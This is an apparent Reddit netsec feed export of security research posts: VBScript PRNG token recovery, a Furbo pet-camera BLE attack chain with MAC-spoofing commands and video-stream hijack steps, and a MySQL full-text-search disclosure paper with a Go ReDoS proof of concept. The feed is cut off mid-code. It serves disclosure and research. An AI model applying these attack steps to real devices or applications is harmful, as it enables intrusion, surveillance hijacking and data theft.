{"id":"3Jheb3FyCEtx7o61cc6N6","title":"Reddit - NetSec","displayTitle":"Reddit - NetSec","url":"","feedLink":"","isQuery":true,"isEmpty":false,"isHidden":false,"itemCount":11,"items":[{"title":"Yet Another Random Story. VBScript's Randomize Internals.","url":"https://blog.doyensec.com/2025/09/25/yet-another-random-story.html","date":1758797417,"author":"/u/nibblesec","guid":87470,"unread":true,"content":"<p>In one of our <a href=\"https://blog.doyensec.com/2025/08/19/trivial-exploit-on-C-random.html\">recent posts</a>, Dennis shared an interesting case study of C# exploitation that rode on -based password-reset tokens. He demonstrated how to use the single-packet attack, or a bit of old-school math, to beat the game. Recently, I performed a security test on a target which had a dependency written in VBScript. This blog post focuses on VBS’s  and shows that the situation there is even worse.</p><p>The application was responsible for generating a secret token. The token was supposed to be unpredictable and expected to remain secret. Here’s a rough copy of the token generation code:</p><div><div><pre><code></code></pre></div></div><p>The first thing I noticed was that the  function was called inside a loop. That should reseed the PRNG on every single iteration, right? That could result in repeated values. Well, contrary to many other programming languages, in VBScript, the  usage within a loop is not a problem per se. The function will not reset the initial state if the same seed is passed again (even if implicitly). This prevents generating identical sequences of characters within a single  call. If you actually want that behavior, call &nbsp;with a <a href=\"https://www.vbsedit.com/html/ac1ef1bb-f1d8-4369-af7f-ddd89c926250.asp\">negative argument</a> immediately before calling &nbsp;with a numeric argument.</p><p>But if that isn’t an issue, then what is?</p><h2>How VBS’s  Works in Practice</h2><p>Here’s a short API breakdown:</p><div><div><pre><code></code></pre></div></div><p>If no seed is explicitly specified,  uses <a href=\"https://www.vbsedit.com/html/700b6bc7-b482-4e3f-a20a-894fb5f0e970.asp\"></a> to set it (not entirely true, but we will get there).  returns seconds since midnight as a  value. ￼ advances a global PRNG state and is fully deterministic for a given seed. Same seed, same sequence, like in other programming languages.</p><p>There are some problematic parts here, though. Windows’ default system clock tick is about 15.625 ms, i.e., 64 ticks per second. In other words, we get a new implicit seed value only once every 15.625 milliseconds.</p><p>Because the returned value is of type , we also get precision loss compared to a  type. In fact, multiple “seeds” round to the same internal value. Think of collisions happening internally. As a result, there are way fewer unique sequences possible than you might think!</p><p><strong>In practice there are at most 65,536 distinct effective seedings (details below). Because  resets at midnight, the same set recurs each day.</strong></p><p>We ran a local copy of the client’s code to generate unique tokens. During almost 10,000 runs, we managed to generate only 400 unique values. The remaining tokens were duplicates. As time passed, the duplicate ratio increased.</p><p>Of course the real goal here would be to recover the original secret. We can achieve that if we know the time of day when the  function started. The more precise the value, the less computations required. However, even if we have only a rough idea, like “minutes after midnight”, we can start at 00:00 and slowly increase our seed value by 15.625 milliseconds.</p><p>We started by double-checking our strategy. We modified the initial code to use a command-line provided seed value. Note, the same seed is used multiple times. While in the original code, it is possible that seed value changes between the loop iterations, in practice that doesn’t happen often. We could expand our PoC to handle such scenarios as well, but we wanted to keep the code as clean as possible for the readability.</p><div><div><pre><code></code></pre></div></div><p>We took a precise  value from another piece of code and used it as an input seed. Strangely though, it wasn’t working. For some reason we were ending up with a completely different PRNG state. It took a while before we understood that  and  aren’t exactly the same things.</p><p>VBScript was introduced by Microsoft in the mid-1990s as a lightweight, interpreted subset of Visual Basic. As of Windows 11 version 24H2, VBScript is a Feature on Demand (FOD). That means it is installed by default for now, but Microsoft <a href=\"https://techcommunity.microsoft.com/blog/windows-itpro-blog/vbscript-deprecation-timelines-and-next-steps/4148301\">plans to disable it in future versions and ultimately remove it</a>. Still, the method of interest is implemented within the  library and we can take a look at :</p><div><div><pre><code></code></pre></div></div><p>When we previously said that a bare  uses  as a seed, we weren’t exactly right. In reality, it’s just a call to WinApi’s . It computes seconds plus fractional milliseconds as s, then narrows to  () using the <a href=\"https://www.felixcloutier.com/x86/cvtpd2ps\"></a> assembly instruction.</p><p>Let’s use  as an example. It can be represented as  in hex notation. After all this math is performed, our  becomes  and is used as the seed input.</p><p>This is what happens otherwise, when the input is explicitly given:</p><div><div><pre><code></code></pre></div></div><p>When we do specify the seed value, it’s processed in an entirely different way. Instead of being converted using the  opcode, it’s shifted right by 32 bits. So this time, our   becomes  instead. We end up with completely different seed input. This explains why we couldn’t properly reseed the PRNG.</p><p>Finally, the middle two bytes of the internal PRNG state are updated with a byte-swapped XOR mix of those bits, while the top and bottom bytes of the state are preserved.</p><p>Honestly, I was thinking about reimplementing all of that to Python to get a clearer view on what was going on. But then, Python reminded me that it can handle almost infinite numbers (at least integers). On the other hand, VBScript implementation is actually full of potential number overflows that Python just doesn’t generate. Therefore, I kept the token-generation code as it was and implemented only the seed-conversion in Python.</p><div><div><pre><code></code></pre></div></div><p>Now, we can run the base code and capture a semi-precise current time value. Our Python works with properly formatted strings, so we can convert the number using a simple method:</p><div><div><pre><code></code></pre></div></div><p>Let’s say the token was generated precisely at  and we got the <code>QK^XJ#QeGG8pHm3DxC28YHE%VQwGowr7</code> string. In the case of our target, we knew that some files were created at 17:55:54, which was rather close to the token-generation time. In other cases, the information leak could come from some resource creation metadata, entries in the log file, etc.</p><p>We iterate time seeds in 0.015625-second steps (64 Hz) across the suspected window and we filter all duplicates.</p><p>We started our  script with a 1s range and we successfully recovered the secret in the 4th iteration:</p><div><div><pre><code>PS C:\\share&gt; python3 .\\brute_timer.py 17:55:54 17:55:55\n[INFO] Range 64554.00000 to 64555.00000 in 0.015625-s steps\n[64554.00000] Test #1: eYIkXKdsUTC3Uz#R)P$BlVRJie9U2(4B // calculated seed: 2.3397787718772567e+36\n[64554.01562] Test #2: ZTDgSGZnPP#yQv*M6L)#hQNEdZ5Px50$ // calculated seed: 2.3397838424796576e+36\n[64554.03125] Test #3: VP!bOBUjLK&amp;uLq8I2G7*cMIAZV0Lt1v* // calculated seed: 2.3397889130820585e+36\n[64554.04688] Test #4: QK^XJ#QeGG8pHm3DxC28YHE%VQwGowr7 // calculated seed: 2.3397939836844594e+36\n[...snip...]\n</code></pre></div></div><p><strong>VBScript’s  and  are fine if you just want to roll some dice on screen, but don’t even think about using them for secrets.</strong></p>","contentLength":6653,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1nq3i96/yet_another_random_story_vbscripts_randomize/"},{"title":"Hacking Furbo - A Hardware Research Project – Part 5: Exploiting BLE","url":"https://www.softwaresecured.com/post/hacking-furbo-a-hardware-research-project-part-5-exploiting-ble","date":1758796297,"author":"/u/duduywn","guid":87471,"unread":true,"content":"<p>Part 5 of the Hacking Furbo blog series is here and in this article we'll be focusing on an area which has gotten little attention thus far: Bluetooth Low Energy (BLE).</p><p>As with Part 2, we continued to find places where Furbo’s security was already quite good. Stubborn as we are, though, we were still able to find areas that were vulnerable. We will detail how we discovered the paths to exploiting various vulnerabilities in Furbo’s implementation of BLE through the analysis of a live device, its logs, and the decompiled mobile application.</p><p>When a new device is first set up, the end-user has to connect that device to their local Wi-Fi network. Furbo handles this by connecting to the user's mobile phone, where a communication flow occurs over Bluetooth to pass the authentication details to the device. Once this is completed, the device ceases to communicate with the application over Bluetooth. Honestly, it was an area we overlooked at first because it was such a quick and seamless process.</p><p>As we dug further into the application and device however, we realized it was an area we should explore further. This interest was prompted by discussions with a colleague who had done ample research on BLE in the past—Kevin2600.</p><p>The first question we wanted to answer was simple: \"Are the communications between device and mobile application encrypted?\"</p><p>To do so, we leaned on adb bugreport. On an Android device with developer options enabled, a report can be generated which details all of the logging information related to the operations of the device. By default, this bugreport does not include Bluetooth communications however by enabling Bluetooth HCI Snoop Log in the Developer settings we could gain insight into these too.</p><p>So, we turned this on, ran the pairing process, and entered in the credentials of a hotspot we had set up for testing. To help us identify the password more easily we used a string we could more easily search for: “FINDMEPASSWORD”.&nbsp;</p><p>We then pulled the report with adb bugreport &lt;filename&gt; onto our host machine and unzipped the archive.</p><p>After digging up the btsnoop_hci.log file, we pulled it into WireShark where we could more easily analyze the communications. There were a ton of logs to parse, so we applied the btatt filter to reduce it some and found the first destination which was a MAC address and started from that point. This packet was our first indicator that we were focusing on the right device.</p><p>Reviewing more of the packets, we realized that much of the communications were split up across several sends, meaning it would be challenging to decipher what exactly was being sent or received. It also seemed as though that some of the data may be hex encoded based on the packets seen in Wireshark. Rather than trying to piece it all together, we grepped out any possible hex values and whipped up a Python script which would parse the log file and hopefully extract whatever data we were looking for.</p><p>And with that, we had our first BLE vulnerability. The passwords and SSIDs which were sent to a Furbo device were being communicated over BLE in an unencrypted format!</p><p>After the excitement of this first finding we decided it would be well worth investigating this interface further. Using an nrf52840 adapter, we set up the Nordic Semiconductor nRF Connect app to view the exposed GATT Characteristics and Services through a graphical interface.</p><p>While we could write to one characteristic, the rest were simply reads which returned information about our device. Fuzzing the writable characteristic with various characters we found that sending 1 or 2 would result in either a \"soft\" or \"hard\" reset of the device—essentially allowing us to turn the device off or disconnect it from the Wi-Fi temporarily.</p><p>The \"soft reset\", from what we could tell, was used to change the Wi-Fi Network the device was connected to. This state was only temporary and once the device was manually rebooted, it would connect back to the original network using the saved credentials it had.</p><p>We will return to the “hard reset” shortly.</p><p>While it may seem like an annoyance at first glance, these devices are touted as security products in some of the marketing materials; meaning that this vulnerability has a slightly higher impact. If, for example, I were a bad guy breaking into someone's house, I could switch off the Furbo's video feed before entering with this vulnerability.</p><p>As we were toying around with the pairing process, we monitored the device logs under /tmp/log, trying to determine what was occurringat each step; it was then that we discovered there must be more GATT Characteristics than what we saw at first glance with the nRF Connect application.</p><p>In the second picture we can see the SSID and Wi-Fi password being sent in hex.</p><p>We figured that if they were being used in the communication flow, they must be referenced somewhere in the APK. Using grep, we searched for the locations of the UUIDs.</p><p>Within this file we found many more characteristics referenced, as well as operations they may be used for.</p><h3>Exposing BLE GATT Characteristics</h3><p>After some trial and error, we discovered that in order to expose the additional GATT characteristics and services&nbsp; we would have to put the device into a factory reset mode. In this state all the GATT characteristics that were listed in the APK were visible and could be interacted with. The challenge for us with this requirement was that you would need physical access to insert a small paperclip and hold down a button for 10 seconds, at which point the attack seemed pointless.</p><p>This brings us back to the previously mentioned reset modes we discovered through fuzzing: the second of which was the “Hard Reset”, this is where things got interesting. When we first ran the full reset command we didn't notice much of a difference compared to the \"Soft Reset\". The device went offline, but when we tried to scan for any other characteristics there were none to be found.</p><p>After doing a little more research into BLE and how connections work we came to the conclusion that after issuing the \"Full Reset\" command, we would have to disconnect and reconnect our session. Once reconnected to the device after sending the \"Full Reset\" command we discovered that  of the device's GATT characteristics were active and available. These newly exposed characteristics opened the door for several attacks which we will explore throughout the rest of the article.</p><p>Our theory was that we may have two different attack scenarios that could be exploited based on the information exposed by these GATT characteristics.</p><p>The first attack was a Denial Of Service which revolved around the device registration process, specifically how devices could be re-registered after they were already bound to an account.</p><p>The second attack could be used to interrupt and replace the camera feed of a device by exploiting how the device authenticated with the TUTK P2P network in order to stream video to the mobile application.</p><p>Both of these attack chains required the following information from the victim device in order work:&nbsp;</p><p>The second attack, in addition to the other three variables, also required the victim's P2P UUID which connected their device to the TUTK network.</p><h3>Reading Sensitive Data from Exposed GATT Characteristics</h3><p>The characteristic C1C1D58F-6CDC-426D-AA4D-5A18BD88FE37 could be used to read the device token and 2E2F1C66-ACE9-46AA-A993-641FCE7A5C9C allowed us to read the P2P UUID the device was using in order to stream video over the TUTK network.</p><p>Using these 2 exposed GATT characteristics, we were able to retrieve two out of the four victim details required to complete the attack chain. Now all that was left was to retrieve the AccountID and DeviceID.</p><p>The AccountID and DeviceID would prove slightly more challenging to retrieve. We knew that the Firehose logging service, which we had decrypted in Part 1 of our blog series, contained these IDs, however up until this point we had only seen it run after a device was first connected to an account. We didn't like the restrictions this put on our attack chain, so we needed to uncover a way to control the Firehose.</p><p>After much testing and log review, we discovered that there were other conditions that could trigger the service to run. If the device was disconnected from the Internet for more than three minutes the Firehose service would collect the data and attempt to send it off once re-connected.</p><p>This was something we could control using some of the other newly exposed GATT characteristics.</p><p>The following GATT characteristics were exposed after the device was put into \"Full Reset\" mode which we could use in order to control the device's internet connection:</p><p>The scenario was fairly simple: if we were within range of the device we could disconnect it from its network, force it to connect to our own access point (while it was not connected to the internet), and then, after allowing for the three minute delay, reconnect it and proxy the traffic through certmitm. The end result was that the Firehose service would run and we'd decrypt the TLS traffic containing the AccountID and DeviceID.</p><h3>Gathering the Furbo Infinity Stones</h3><p>The complete attack chain, using the Furbonator script:</p><ol role=\"list\"><li>Get within range of the victim's Furbo device.</li><li>Connect to the device over Bluetooth and put it into \"Full Reset\" mode.</li><li>Retrieve the Device Token.</li><li>Reset the WiFi Connection.</li><li>Send the attacker-controlled SSID.</li><li>Send the password for the attacker-controlled access point.</li><li>Allow for a three minute delay.</li><li>Send the Wi-Fi Ready command so the Victim Furbo Connects to your proxied network.</li><li>Capture Firehouse logs using certmitm and grab the AccountID.</li></ol><h3>Denial of Service — Re-Registering Victim Device</h3><p>With these details we were now ready to attempt our first attack: re-registering the victim's device to our account.</p><p>By combining the previous DeviceID Spoofing attack with the leaked AccountID, DeviceID, and Device Token an attacker can now re-register a victim's device, completely disabling it and preventing it from ever being registered again.</p><ol role=\"list\"><li>Factory reset the attacker device.</li><li>Connect to the device over UART and replace the MAC address with the victim's DeviceID. <ol role=\"list\"><li>sed -i 's/\"system\\/info\\/mac\": *\"[^\"]*\"/\"system\\/info\\/mac\": \"[VICTIM_MAC]\"/' /mnt/hw/factory.json</li></ol></li><li>Modify /mnt/flash/furbo/setup_info.json, adding the victim's AccountID, DeviceID and DeviceToken.</li><li>Add the device to the attacker's account following the instructions in the mobile application.</li><li>During the registration process, when prompted with the message,\"This Furbo was already registered. If you register a new account the previous account will be disconnected\" click \"Register New Account\".</li></ol><p>Once the setup is completed the attacker should now have the victim's device added to their account.</p><p>As their DeviceID is now associated with the attacker's account, and they cannot get the DeviceToken, the victim will be unable to re-register their device to their own account. As a result, they will have lost all functionality of their Furbo device, essentially bricking it.</p><h3>Look at me! I am the camera now</h3><p>Building off of the DoS re-registration attack we could take this one step further. We could use the P2P UUID grabbed from BLE to interrupt the victim's video stream and replace it with the attacker's own stream. This is possible by abusing the P2P authentication flow in order to re-issue credentials for the spoofed UUID, authorizing the attacker device to stream on the TUTK network and replacing the victim's video stream with their own.</p><p>In order to stream on the TUTK network each device requires P2P UUID. When a device is registered to your account you are also authorizing the mobile account to request the video stream from that particular P2P UUID.</p><p>When the device is paired and registered, the mobile application retrieves a P2PAccountID, P2PAuthKey, and P2PPassword from an API—which are the values we retrieved from the device's memory in Part 2. These details are then passed to the device, from which it is sent back to the Furbo servers to retrieve a P2P UUID.</p><p>This P2P UUID is bound to the DeviceID; even when a device is reset the DeviceID stays the same, meaning that when it reconnects it will maintain the same P2P UUID.</p><p>However, having the P2P UUID is not enough to stream on the TUTK network. You also require an Authkey and Password. However, these credentials can automatically be generated and reissued to a device as long as it has a valid AccountID, DeviceID, DeviceToken, and P2P UUID which in our case we do.</p><h3>Credential Regeneration Flow</h3><ol role=\"list\"><li>The device boots and checks for P2P credentials, if it fails to find the p2p_auth.json file the following flow occurs.</li><li>The device makes POST requests to: /v5/device/setup, supplying the AccountID, DeviceToken, DeviceID, and P2P UUID.</li><li>Furbo validates the request <ol role=\"list\"><li>Confirms P2P UUID ↔ DeviceID ↔ AccountID relationship</li><li>Issues new TUTK credentials: authKey, password.</li></ol></li><li>Device writes a new p2p_auth.json file <ol role=\"list\"><li>Old credentials are invalidated (only the latest credentials for a P2P UUID are valid on the TUTK network).</li></ol></li></ol><h3>Taking over the video stream</h3><ol role=\"list\"><li>Register the device so it is active in the mobile application.</li><li>Connect to device over UART and replace the MAC address with the victim's DeviceID <ol role=\"list\"><li>sed -i 's/\"system\\/info\\/mac\": *\"[^\"]*\"/\"system\\/info\\/mac\": \"[VICTIM_MAC]\"/' /mnt/hw/factory.json</li></ol></li><li>Edit the /mnt/flash/furbo/setup_info.json file and add the victim's AccountID, DeviceID, DeviceToken, and P2P UUID.</li><li>Remove the /mnt/flash/furbo/p2p_auth.json file.</li></ol><p>Once the attacker's device reboots it will check to see if that p2p_auth.json file is located on the device, it will then reach out to Furbo's servers in order to retrieve the details. As all the details on the attacker's device are the same as the victim's device, Furbo will generate new credentials for the victims P2P UUID, invalidating their own. As a result, the attacker's device is the only valid “online” device for that P2P UUID. When the victim opens their mobile application, they will see the attacker's video stream and not their own as that is what will be returned when the application searches for that P2P UUID on the TUTK network.</p><p>That concludes Part 5 of the Hacking Furbo blog series. BLE is an often overlooked communication protocol, one we nearly overlooked ourselves. However, as we have shown, it can yield very interesting results when it is interrogated effectively. We were able to build attack chains based on data garnered through BLE to take over the device’s video streams and gain unauthorized access to someone’s Wi-Fi network, serious stuff. The next part will be the grand finale! We will finish off with a review of the filesystem where we found numerous vulnerabilities including one which allowed us to view the activity of  Furbo worldwide.</p>","contentLength":14763,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1nq36wg/hacking_furbo_a_hardware_research_project_part_5/"},{"title":"Why “contained” doesn’t mean “safe” in modern SOCs","url":"https://blog.strandintelligence.com/compliance-wont-stop-a-breach-heres-why/","date":1758791554,"author":"/u/SuccessfulMountain64","guid":87426,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1nq1xu9/why_contained_doesnt_mean_safe_in_modern_socs/"},{"title":"ReDisclosure: New technique for exploiting Full-Text Search in MySQL (myBB case study)","url":"https://exploit.az/posts/wor/","date":1758748359,"author":"/u/Difficult-Catch9885","guid":87287,"unread":true,"content":"<section><pre tabindex=\"0\"><code>\"Even a small key can open a big lock\" Azerbaijani Proverb\n\n---[ Index\n1 - Introduction\n2 - Tradition\n    2.1 - ReDoS, not the OS\n    2.2 - REGEXP, RLIKE and others\n3 - How insecure, secure implementations are?\n4 - Study Case: myBB\n    4.1 - Identification\n    4.2 - Perfect Match Against Sanitization\n    4.3 - Exploiting\n5 - Acknowledgements\n6 - References\n\n--[ 1 - Introduction\nFor years, SQL Injection has been mostly about syntax-breaking payloads. But\nwith tools getting advanced, it is more about creating \"cooler payload\" /\nfinding ignored SAST warnings. I am a newbie who noticed this pattern going\nback and forth and started searching for possibility of injection, without\nescaping anything, something that SAST/WAFs don't have a rule for.\n\nThis paper presents a new technique for Regex Injection. At the beginning I\nwill explain just a bit of traditional methods that we knew before, then\nshift into the technique and then we will study one of the vulnerabilities I\nfound in myBB which allowed viewing deleted thread names as an\nunauthenticated user.\n\n--[ 2 - Tradition\nThis section explains traditional methods that were usually used to identify\nvulnerabilities related to regex. But before going further, let's understand\nthe difference between regex, wildcard, and operator. BTW, originally I\nwanted to call this paper WOR technique.\n\n----[ 2.1 - ReDoS, not the OS\nA regular expression (Regex) is a sequence of characters that specifies a\nmatch pattern in text. The main feature of regex is the ability to match\ncomplex string patterns. A wildcard, on the other hand, is a symbol used to\nrepresent zero or more characters. In SQL, the percent sign (%) and\nunderscore (_); in regex, the period (.) and asterisk (*) are considered\nwildcards. Operators are logical symbols; some examples include AND, OR,\nNOT, =, !=, &lt;, &gt;, &gt;=, &lt;=, +, -, *, /. Operators like asterisk are used for\ncalculations, so don't confuse them with wildcards. I guess now you\nunderstand why I wanted to call it WOR technique. Certainly not because WOR\nmeans thief in Russian and the whole article is about a technique for\nstealing information from software that I can't write about because its\ndevelopers prioritize feature over security.\n\nBacktracking is a problem-solving method where you return to a previous\ndecision point (backtrack) in a process and try a different option when the\ncurrent path fails to produce a valid result. It is like being in a\nlabyrinth with multiple paths. You try one path, but hit a dead end. So, you\nbacktrack--go back to the last junction where you had other options--and try\na different direction. You keep repeating this process until you either find\nthe exit or exhaust all paths.\n\nA quantifier specifies how many times the preceding element must occur for a\nmatch to happen.\n\nQuantifier | Meaning                           | Regex | Match\n++++++++++++++++++++++++++++++++++++++++++++\n*                | Zero or more times          | p*       | \"\",\"p\",\"ph\"...\n+                | One or more                   | p+       | \"p\",\"ph\",\"phr\"\n?                | Zero or one                     | p?       | \"\", \"p\"\n{n}              | n times                           | p{3}     | \"ppp\"\n{n,}             | n or more times              | p{2,}    | \"pp\",\"ppp\"...\n{n,m}          | Between n and m times | p{2,4}  | \"pp\", \"ppp\", \"pppp\"\n\nNested quantifiers are patterns where a quantifier is applied to a subpattern\nthat already has a quantifier. So I can't just take p+? pattern, add\nquantifier + and make it p+?+, because the syntax is invalid. This is where\n\"Capturing group\" comes to help. The p+ means \"one or more p.\" When we add ?\nto it, it means \"one or more p's (the + part), but not more than one (the ?\npart) p.\" It means that if the input is \"ppp,\" the output will match exactly\none p. So the output will be Match 1 (p), Match 2 (p), Match 3 (p). Now\nwhen I group this subpattern (p+?), the pattern match will stay the same,\nand the group match will be the same as the pattern match, because there is\nno extra quantifier. If I change it a bit by adding +, making it (p+?)+, it\nwill mean \"one or more p's, but not more than one p, repeated one or more\ntimes until it succeeds.\" So the subpattern will repeat until it succeeds;\nthe inner regex takes the first p, second p, and third p. Now that no more\ncharacters are left, the pattern stops. Overall match is the concatenation\nof all results \"ppp.\" A capturing group only \"remembers\" the last result of\nthe subpattern, which is \"p.\"\n\nPattern  | Meaning of pattern   | Regex | Match Result  |\n++++++++++++++++++++++++++++++++++++++++++\n(...)        | groups a subpattern | (p+?)+ | \"ppp\" (pattern |\nmatch), \"p\" (group match)\n++++++++++++++++++++++++++++++++++++++++++\nReDoS (Regular Expression Denial of Service) is a vulnerability where a regex\nlets an attacker supply input that makes the engine backtrack for an\nextremely long time, causing DoS. Usually, regex that has nested qualifiers\nleads to ReDoS.\n\nTo create a ReDoS payload, our inner quantifier should grab as much as it\ncan. Therefore, the subpattern could be something like a+ or a*. If our\ninput is aaaac, it will match aaaa. Next, we can create a nested quantifier\nby using a* as the subpattern and then adding a + quantifier. This way, the\na* group will match repeatedly until it succeeds. Our new regex is (a*)+.\n\nIf the input is aaaac, the first match is aaaa. Then, because the asterisk\n(*) means \"zero or more,\" we also get zero-length matches. For instance,\nafter aaaa is matched, there is an empty match between aaaa and c, and\nanother empty match after c, giving three matches in total (two of which are\nempty).\n\nWe can force a mismatch after these matches by adjusting the pattern to\nexpect the string to end with b, even though our input ends with c. Hence,\nthe new regex is (a*)+b, and our input remains aaaac. The (a*)+ part can\nmatch aaaac in numerous ways because a* can match zero or more 'a's, and the\n+ quantifier allows multiple such matches. Each different way (a*)+ can\nconsume part of the string is a \"possible result\" for that subpattern. Since\nthe overall regex (a*)+b fails on its first attempt, the regex engine must\nbacktrack and see if there was another way for (a*)+ to match aaaac that\nmight allow the subsequent b to match. The bigger the input, the more\nbacktracking possibilities are created, leading to a potential DoS.\n\nFor example (just for demonstration), consider ways of partitioning aaaa into\none or more non-empty groups of a. This is not exactly how most regex\nengines work, but it illustrates the concept of multiple ways to match.\n1: (\"aaaa\")\n2: (\"aaa\")(\"a\")\n3: (\"aa\")(\"aa\")\n4: (\"a\")(\"aaa\")\n5: (\"aa\")(\"a\")(\"a\")\n6: (\"a\")(\"aa\")(\"a\")\n7: (\"a\")(\"a\")(\"aa\")\n8: (\"a\")(\"a\")(\"a\")(\"a\")\n\nPattern | Description                               | Input     |\n-----------|-----------------------------------------|------------|\n(a*)+b   | inner a+ (1 or more a), outer    | aaaac   |\n             | (...)+ repeats                            |              |\n-----------|-----------------------------------------|------------|\nExample script to demonstrate ReDoS:\n____________________________________________________________\npackage main\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"os/exec\"\n    \"os/signal\"\n    \"strings\"\n    \"syscall\"\n    \"time\"\n    \"github.com/dlclark/regexp2\"\n)\n\nfunc main() {\n    fmt.Println(\"ReDoS PoC\")\n    count := 200\n    pid := os.Getpid()\n    re := regexp2.MustCompile(`(a*)+b`, 0)\n    input := strings.Repeat(\"a\", count) + \"c\"\n    sigs := make(chan os.Signal, 1)\n    signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)\n    done := make(chan struct{})\n    go func() { &lt;-sigs; close(done); os.Exit(0) }()\n    go func() { re.MatchString(input); close(done) }()\n    for {\n        select {\n        case &lt;-done:\n            return\n        default:\n            out, _ := exec.Command(\"ps\", \"-p\", fmt.Sprintf(\"%d\", pid),\n                \"-o\", \"%cpu=\").Output()\n            cpu := strings.TrimSpace(string(out))\n            fmt.Printf(\"CPU usage: %s\\n\", cpu)\n            time.Sleep(500 * time.Millisecond)\n        }\n    }\n}\n____________________________________________________________\nResponse:\nkhatai@5df0825ade8a tmp % go run main.go\nReDoS PoC\nCPU usage: 0.0\nCPU usage: 80.2\nCPU usage: 97.7\nCPU usage: 100.0\nCPU usage: 100.0\n\n----[ 2.2 - REGEXP, RLIKE and others\nBeyond application-level regex engines, many database systems also use\nregular expressions for matching strings. Let's, for instance, take REGEXP.\nREGEXP itself can lead to information disclosure, and prepared statements\nwon't help, as this has nothing to do with the regex itself. It all comes\ndown to insecure implementation. For example, in a case where an SQL query\nis like this: SELECT Name FROM Data WHERE Content REGEXP '^?', using\nprepared statements or backslashing (preg_quote) won't be much help. If user\ninput is .*, it all will look like this:\nInput: '.*'\nTrimmed: '.*'\npreg_quote()'d and escaped: '\\.\\*'\nFinal REGEXP Pattern: '^\\.\\*'\nSELECT Name FROM Data WHERE Content REGEXP '^\\.\\*';\n\nProblems like these can be easily fixed if there is a \"visibility\" column\nor some special prevention against regex cases. In most applications, there\nprobably are implementations to prevent these cases from happening. So we\nwill want an SQL function, which accepts a \"sequence of characters that\nspecifies a match pattern in text\" (which basically defines regex) but isn't\ndocumented as a regex function in the MySQL documentation.\n\n--[ 3 - How insecure, secure implementations are?\nLet's take `real_escape_string` for example; everything seems fine, as it\nescapes single and double quotes, which are usually enough. But if you take\na look at \"backup\" and similar options of most systems, you will notice\nthat they don't use single/double quotes, they use backticks for table\nnames. Backticks are used mostly with REPAIR, EXPORT, OPTIMIZE, ANALYZE,\nTRUNCATE, ALTER and so on. It might seem dumb, but I consider this as\ninsecure design rather than insecure implementation. The C API function\n`mysql_real_escape_string_quote`, escapes backticks, while nothing else I\nhave seen does. The above part was just an example, a \"noteworthy comment\"\nif you will.\n\nThe real deal is Full-Text Search Functions. They are used in most\nsoftwares, especially blogs, LMS, and forums for advanced searching.\nAccording to Wikipedia, \"Full-text search refers to techniques for searching\na single computer-stored document or a collection in a full-text database\".\nWhen performing Full-text search (from now on FTS) DBMS use certain\ncharacters with special meanings. These characters also specify match\npattern, which defines regex, but not the usual regex we know of; this one\nis custom. MySQL can perform boolean full-text searches using special\nboolean mode operators; the syntax looks like this: MATCH (col1,col2,...)\nAGAINST (expr [search_modifier]). But before going into that, here is a\nbasic table showing the difference between the Regex we know and Boolean\nMode Operators.\n\nCharacter  | Traditional Regex | MySQL Boolean Mode        |\n________________________________________________\n| +        | one or more                   | word must be present       |\n| -         | No special meaning       | word must not be present |\n| *         | zero or more                  | Wildcard character           |\n| ^        | start of string or line       | No special meaning          |\n| $        | end of string or line        | No special meaning          |\n| .         | Wildcard character         | No special meaning          |\n| ()        | Grouping subpatterns   | Grouping subexpressions  |\n| []        | any character in the set | No special meaning           |\n| {n,m} | between n and m           | No special meaning           |\n| \"\"       | No special meaning        | exact sequence of words  |\n| &lt;       | No special meaning        | increases weight of term    |\n| &gt;       | No special meaning         | decreases weight of term  |\n| ~       | No special meaning         | same as decrease weight |\n_________________________________________________\nExample query from MySQL Doc, which shows queries containing MySQL and not\ncontaining YourSQL:\nmysql&gt; SELECT * FROM articles WHERE MATCH (title,body)\n    -&gt; AGAINST ('+MySQL -YourSQL' IN BOOLEAN MODE);\n_____________________________________\n| id | title                                    | body               |\n++++++++++++++++++++++++++++++++++++\n|  1 | MySQL Tutorials For         | DBMS stands |\n|  2 | How To Use MySQL Well | After you went |\n|  3 | Optimizing MySQL in the | In this tutorial   |\n|  4 | 1001 MySQL Tricks          | 1. Never run    |\n|  6 | MySQL Security               | When configu. |\n_____________________________________\n\nI think you see the problem now, there aren't any special implementations\nthat would prevent these special operators (custom regex) from executing and\nthe query itself is in quotes. So, we found something that:\n1. Doesn't require any escape\n2. Isn't identified by WAFs/SASTs/DASTs or anything else\n3. Has the possibility of leaking data\n\nNow the pros against REGEXP, RLIKE, LIKE and normal search:\n1. No one calls it regex, so input often won't be sanitized against\n   asterisks, etc.\n2. Has logic which might come in handy if needed\n\nThe attack vector on which we should focus is Search functions, especially\nthe ones which show \"name\" but don't show content, or show \"count\" of\ndocuments that contain a \"content\". Basically, anything that gives you an\nidea of the word \"contains\".\n\nObviously, this kind of stuff isn't about theory, it is about practice. So\nI downloaded a list of open source web applications using a database and\nidentified this pattern in some of them. The quickest and only fix at the\nmoment was done by myBB team and identified as CVE-2025-48941. Before going\nfurther, here is a list of similar functions in other DBMSs.\n\nDBMS            | Full-text function / predicate\n_______________________________________________________________\nMySQL          | MATCH(col) AGAINST ('+python -java' IN BOOLEAN MODE)\nPostgreSQL  | to_tsvector(col) @@ to_tsquery('python &amp; !java') or\n                      | @@ websearch_to_tsquery('python -java')\nSQL Server   | CONTAINS(col, ' \"python\" AND NOT \"java\" ')\nOracle DB     | CONTAINS(col, 'python AND NOT java') &gt; 0\nIBM Db2        | CONTAINS(col, '\"python\" &amp; !\"java\"') =1\n_______________________________________________________________\n\n--[ 4 - Study Case: myBB\nThis section covers analysis of CVE-2025-48941. In my test env I enabled\nFTS. I put \"Search Flood Time (seconds)\" to 0, to ease my work, having\nmultiple accounts or using proxies would provide the same effect (this value\nisn't crucial, it is only for the exploit to work faster), and I have 2\ndeleted threads with titles \"jackie chan\" and\n\"0ce3266d4eb71ad50f7a90aee6d21dcd\"\n\n----[ 4.1 - Identification\nDeleted threads are visible to an admin when searching, and the search\nfunction is the same for an admin and a user, so the question is, what will\nbe visible exactly?\n\nThe `perform_search_mysql_ft` uses MATCH AGAINST functions when searching.\n--------------------------------------------------------------------------\n/inc/functions_search.php\n\n$message_lookin = \"AND 